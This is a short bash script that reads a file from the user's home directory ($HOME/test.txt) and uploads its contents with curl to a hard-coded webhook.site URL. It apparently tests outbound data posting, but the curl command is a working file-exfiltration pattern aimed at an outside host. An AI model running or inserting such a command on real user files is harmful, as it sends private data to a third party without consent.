#!/usr/bin/env bash
set -euo pipefail

WEBHOOK_URL="https://webhook.site/20400fcc-db5f-4c83-aaa3-b0ae299c9346"
FILE="$HOME/test.txt"

if [[ ! -f "$FILE" ]]; then
  echo "File not found: $FILE"
  exit 1
fi

curl -X POST \
  -H "Content-Type: text/plain" \
  --data-binary "@${FILE}" \
  "$WEBHOOK_URL"